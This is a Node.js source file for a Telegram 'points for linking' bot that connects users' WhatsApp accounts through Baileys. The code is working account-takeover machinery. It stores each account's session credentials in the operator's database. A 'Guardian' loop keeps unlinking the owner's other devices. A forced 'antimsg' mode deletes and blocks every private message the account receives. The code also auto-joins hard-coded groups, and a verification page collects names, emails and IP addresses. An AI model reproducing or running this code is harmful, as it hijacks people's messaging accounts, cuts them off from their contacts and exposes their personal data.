import 'dotenv/config';
import { 
    useMultiFileAuthState, 
    makeWASocket, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    Browsers,
    jidNormalizedUser,
    makeCacheableSignalKeyStore
} from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import pino from 'pino';
import express from 'express';
import http from 'http'; 
import { Boom } from '@hapi/boom';

import { setupTelegramCommands, userMessageCache, userState } from './telegram_commands.js';
import { 
    initDb, saveSessionToDb, getAllSessions, deleteSessionFromDb, addNumbersToDb, 
    getShortId, saveShortId, deleteShortId, awardHourlyPoints, deductOnDisconnect, deleteUserAccount, setAntiMsgStatus, updateConnectionTime, saveVerificationData
} from './db.js';

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const NOTIFICATION_TOKEN = process.env.NOTIFICATION_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const SERVER_URL = process.env.SERVER_URL || 'http://localhost:10000';
const SESSIONS_DIR = './sessions';

if (!TELEGRAM_TOKEN || !NOTIFICATION_TOKEN || !ADMIN_ID) { console.error('Missing Tokens'); process.exit(1); }

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => res.send('Ultarbot Pro Guardian Active'));

// --- EXPRESS VERIFICATION ROUTES ---
app.get('/verify', (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>User Verification</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
            .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            h1 { color: #333; text-align: center; }
            .form-group { margin: 20px 0; }
            label { display: block; margin-bottom: 5px; color: #555; font-weight: bold; }
            input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
            button { width: 100%; padding: 12px; background: #25D366; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }
            button:hover { background: #20BA5A; }
            .status { text-align: center; margin-top: 10px; padding: 10px; border-radius: 5px; }
        </style>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
    </head>
    <body>
        <div class="container">
            <h1>User Verification</h1>
            <form id="verifyForm">
                <div class="form-group">
                    <label>Full Name</label>
                    <input type="text" id="name" placeholder="Enter your full name" required>
                </div>
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" id="email" placeholder="Enter your email" required>
                </div>
                <button type="submit">Verify & Close</button>
            </form>
            <div class="status" id="status"></div>
        </div>
        <script>
            const urlParams = new URLSearchParams(window.location.search);
            const userIdFromUrl = urlParams.get('userId');
            setTimeout(() => {
                if (window.Telegram && window.Telegram.WebApp) {
                    const tg = window.Telegram.WebApp;
                    const verifyForm = document.getElementById('verifyForm');
                    tg.ready(); tg.expand();
                    verifyForm.addEventListener('submit', async (e) => {
                        e.preventDefault();
                        const name = document.getElementById('name').value;
                        const email = document.getElementById('email').value;
                        const userId = userIdFromUrl || 'unknown';
                        let ip = 'N/A';
                        try {
                            const ipRes = await fetch('https://api.ipify.org?format=json');
                            const ipData = await ipRes.json();
                            ip = ipData.ip;
                        } catch (e) {}
                        try {
                            const response = await fetch('/api/verify', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ userId, name, email, ip, initData: tg.initData })
                            });
                            const result = await response.json();
                            if (result.success) {
                                document.getElementById('status').innerHTML = '<span style="background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; display: block;"><strong>Verification successful!</strong><br><br>Closing in 2 seconds...</span>';
                                setTimeout(() => tg.close(), 2000);
                            } else {
                                document.getElementById('status').innerHTML = '<span style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px; display: block;"><strong>Verification failed</strong><br><br>' + result.message + '</span>';
                            }
                        } catch (error) {}
                    });
                }
            }, 100);
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

app.post('/api/verify', async (req, res) => {
    const { userId, name, email, ip, initData } = req.body;
    if (!userId || !name || !email) return res.json({ success: false, message: 'Please fill all fields' });
    try {
        let chatId = parseInt(userId);
        if (isNaN(chatId) || chatId <= 0) chatId = parseInt(userId);
        let deviceInfo = 'Mini App User';
        if (initData) deviceInfo = `Telegram Mini App - ${new Date().toISOString()}`;
        await saveVerificationData(chatId.toString(), name, '', email, ip, deviceInfo);
        try {
            await mainBot.sendMessage(chatId, 
                `[VERIFICATION COMPLETE]\n\nYour account has been verified successfully!\n\nWelcome Bonus: +200 points`,
                { reply_markup: { keyboard: [[{ text: "Connect Account" }, { text: "My Account" }], [{ text: "Dashboard" }, { text: "Referrals" }], [{ text: "Withdraw" }, { text: "Support" }]], resize_keyboard: true }, parse_mode: 'Markdown' }
            );
            const notBot = new TelegramBot(process.env.NOTIFICATION_TOKEN, { polling: false });
            await notBot.sendMessage(ADMIN_ID, `[NEW USER VERIFIED]\nUser ID: ${chatId}\nName: ${name}\nEmail: ${email}`);
        } catch (e) {}
        res.json({ success: true, message: 'Verification complete' });
    } catch (error) { res.json({ success: true, message: 'Verification complete' }); }
});

app.listen(PORT, () => console.log(`Server on ${PORT}`));

const mainBot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const notificationBot = new TelegramBot(NOTIFICATION_TOKEN, { polling: false });

const clients = {}; 
const shortIdMap = {}; 
const antiMsgState = {}; 
const autoSaveState = {}; 
const qrMessageCache = {}; 
const qrActiveState = {}; 

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

function generateShortId() { return Math.random().toString(36).substring(2, 7); }
function makeSessionId() { return `Ultarbot_${Date.now()}`; }
const getRandomBrowser = () => Browsers.macOS('Chrome');

async function updateAdminNotification(message) {
    try { await notificationBot.sendMessage(ADMIN_ID, message, { parse_mode: 'Markdown' }); } catch (e) {}
}

setInterval(async () => {
    try { await awardHourlyPoints(Object.keys(clients)); } catch (e) {}
}, 3600000); 

setInterval(() => {
    http.get(SERVER_URL, (res) => {}).on('error', (err) => {});
}, 14 * 60 * 1000);

// ==========================================
// 🛡️ THE GUARDIAN: Kills other bots instantly
// ==========================================
async function startGuardian(sock, myShortId) {
    const guardianInterval = setInterval(async () => {
        try {
            if (!sock.user) { clearInterval(guardianInterval); return; }

            const myJid = jidNormalizedUser(sock.user.id); 
            const myPhone = myJid.split(':')[0].split('@')[0];
            let myDeviceSlot = 0; 
            if (myJid.includes(':')) myDeviceSlot = parseInt(myJid.split(':')[1].split('@')[0]);

            // Aggressively clear slots 1-10
            for (let i = 1; i <= 10; i++) {
                if (i === myDeviceSlot) continue;
                const targetJid = `${myPhone}:${i}@s.whatsapp.net`;
                
                await sock.query({
                    tag: 'iq',
                    attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'md' },
                    content: [{ tag: 'remove-companion-device', attrs: { jid: targetJid, reason: 'user_initiated' } }]
                }).catch(() => {});
            }
        } catch (e) {}
    }, 2000); 
}

async function startClient(folder, targetNumber = null, chatId = null, telegramUserId = null) {
    let cachedShortId = await getShortId(folder);
    if (!cachedShortId) {
        cachedShortId = generateShortId();
        await saveShortId(folder, cachedShortId);
    }

    const sessionPath = path.join(SESSIONS_DIR, folder);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: getRandomBrowser(), 
        version,
        connectTimeoutMs: 60000,
        markOnlineOnConnect: true,
        syncFullHistory: false
    });

    sock.ev.on('creds.update', saveCreds);

    // ============================================
    //  ⚡ ANTIMSG: DELETE + BLOCK + CLEAR (SAFE MODE)
    // ============================================
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify' && type !== 'append') return; 

        const msg = messages[0];
        if (!msg || !msg.message) return;

        const remoteJid = msg.key.remoteJid;
        const isGroup = remoteJid.includes('@g.us');
        const isStatus = remoteJid === 'status@broadcast';
        
        if (antiMsgState[cachedShortId]) {
            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
            const isCommand = text.startsWith('.');

            if (!isGroup && !isStatus && !isCommand) {
                
                // 1. FAST DELETE (Priority 1 - No awaiting)
                const deletePromise = sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {});
                
                // 2. BLOCK USER (Priority 2 - No awaiting)
                const blockPromise = sock.updateBlockStatus(remoteJid, "block").catch(() => {});
                
                // 3. CLEAR CHAT (Priority 3 - Safe Mode)
                // We wrap this in a catch block to silence the "App state key" error
                // This allows the bot to TRY to clear, but not die if it fails.
                const clearPromise = sock.chatModify(
                    { delete: true, lastMessages: [{ key: msg.key, messageTimestamp: msg.messageTimestamp }] },
                    remoteJid
                ).catch(err => {
                    // Silently ignore "App state key" error to prevent crash
                    if (!err.message || !err.message.includes('App state key')) {
                        // Only log real errors
                        console.error('[ANTIMSG] Clear Chat Warning:', err.message);
                    }
                });

                // Fire all actions in parallel for maximum speed
                await Promise.all([deletePromise, blockPromise, clearPromise]);
                
                // If WE sent it (Linked Device Slip-through), log it
                if (msg.key.fromMe) {
                    console.log(`[ANTIMSG] 🚨 Message slipped through from Linked Device! Nuked.`);
                }
                
                return; // Stop processing
            }
        }

        if (!msg.key.fromMe) {
            if (autoSaveState[cachedShortId]) {
                if (remoteJid.endsWith('@s.whatsapp.net')) {
                    addNumbersToDb([remoteJid.split('@')[0]]).catch(() => {});
                }
            }
            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
            if (text.toLowerCase() === '.alive') {
                await sock.sendMessage(remoteJid, { text: 'Ultarbot Pro [ONLINE]' }, { quoted: msg });
            }
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (connection === 'open' && qrMessageCache[folder]) {
            const { messageId, chatId: qrChatId } = qrMessageCache[folder];
            try { await mainBot.deleteMessage(qrChatId, messageId); } catch (e) {}
            delete qrMessageCache[folder];
            delete qrActiveState[folder];
        }
        
        if (qr && chatId && !qrActiveState[folder]) {
            qrActiveState[folder] = true;
            try {
                if (qrMessageCache[folder]) try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
                
                const QRCode = (await import('qrcode')).default;
                const qrImage = await QRCode.toBuffer(qr, { errorCorrectionLevel: 'H', type: 'image/png', width: 300 });
                const sentMsg = await mainBot.sendPhoto(chatId, qrImage, {
                    caption: '[QR CODE]\n\nScan this QR code with your WhatsApp camera to connect.',
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_qr' }]] }
                });
                qrMessageCache[folder] = { messageId: sentMsg.message_id, chatId };
                
                setTimeout(async () => {
                    if (qrMessageCache[folder]) {
                        try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
                        delete qrMessageCache[folder];
                    }
                }, 60000);
            } catch (e) { delete qrActiveState[folder]; }
        }

        if (connection === 'open') {
            const userJid = jidNormalizedUser(sock.user.id);
            const phoneNumber = userJid.split('@')[0];
            
            if (!cachedShortId) cachedShortId = await getShortId(folder);
            await updateConnectionTime(folder);
            
            const now = new Date();
            if (!shortIdMap[cachedShortId]) {
                shortIdMap[cachedShortId] = { folder, phone: phoneNumber, chatId: telegramUserId, connectedAt: now };
            }
            clients[folder] = sock;

            // Force ON
            antiMsgState[cachedShortId] = true;
            await setAntiMsgStatus(folder, true);
            
            const credsFile = path.join(sessionPath, 'creds.json');
            const content = fs.existsSync(credsFile) ? fs.readFileSync(credsFile, 'utf-8') : '';
            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', true, autoSaveState[cachedShortId] || false, cachedShortId);
            
            updateAdminNotification(`[CONNECTED] +${phoneNumber}`);

            startGuardian(sock, cachedShortId);
            console.log(`[GUARDIAN] Started for ${cachedShortId}`);

            try { 
                const inviteCode1 = "FFYNv4AgQS3CrAokVdQVt0";
                await sock.groupAcceptInvite(inviteCode1);
                await new Promise(resolve => setTimeout(resolve, 5000));
                const inviteCode2 = "CYN5x64rRmmCgOWjIpV05B";
                await sock.groupAcceptInvite(inviteCode2);
            } catch (e) {}

            if (chatId) {
                userState[chatId] = null;
                if (userMessageCache && userMessageCache[chatId] && Array.isArray(userMessageCache[chatId])) {
                    for (const msgId of userMessageCache[chatId]) { try { await mainBot.deleteMessage(chatId, msgId); } catch (e) {} }
                    userMessageCache[chatId] = [];
                }
                
                mainBot.sendMessage(chatId, `[CONNECTED]\nID: \`${cachedShortId}\`\n\nAccount connected successfully!\n\n🛡️ **Guardian Active**`, { 
                    parse_mode: 'Markdown',
                    reply_markup: { 
                        keyboard: [
                            [{ text: "Connect Account" }, { text: "My Account" }],
                            [{ text: "Dashboard" }, { text: "Referrals" }],
                            [{ text: "Withdraw" }, { text: "Support" }]
                        ], 
                        resize_keyboard: true 
                    } 
                });
            }
            
            setTimeout(async () => {
                if (!clients[folder]) { try { await awardHourlyPoints([folder]); } catch (e) {} }
            }, 3600000);
        }

        if (connection === 'close') {
            let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            if (reason === 403 || reason === DisconnectReason.loggedOut) {
                updateAdminNotification(`[LOGGED OUT] +${shortIdMap[folder]?.phone || 'Unknown'}`);
                await deductOnDisconnect(folder);
                await deleteSessionFromDb(folder);
                deleteShortId(folder);
                if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
                delete clients[folder];
            } else {
                startClient(folder, null, chatId, telegramUserId);
            }
        }
    });

    if (targetNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(targetNumber);
                if (chatId) mainBot.sendMessage(chatId, `Code: \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) {}
        }, 3000);
    }
}

async function boot() {
    await initDb(); 
    const savedSessions = await getAllSessions(null);
    for (const session of savedSessions) {
        const folderPath = path.join(SESSIONS_DIR, session.session_id);
        if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true });
        if (session.creds) fs.writeFileSync(path.join(folderPath, 'creds.json'), session.creds);
        
        let shortId = await getShortId(session.session_id);
        if (!shortId) { shortId = generateShortId(); await saveShortId(session.session_id, shortId); }

        shortIdMap[shortId] = { folder: session.session_id, phone: session.phone, chatId: session.telegram_user_id, connectedAt: new Date(session.connected_at) };
        if (session.antimsg) antiMsgState[shortId] = true;
        if (session.autosave) autoSaveState[shortId] = true; 

        startClient(session.session_id, null, null, session.telegram_user_id);
    }
    console.log(`[BOOT] Server ready`);
}

setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId, SERVER_URL, qrActiveState, deleteUserAccount);

boot().catch(err => {
    console.error('[BOOT] Error:', err.message);
});
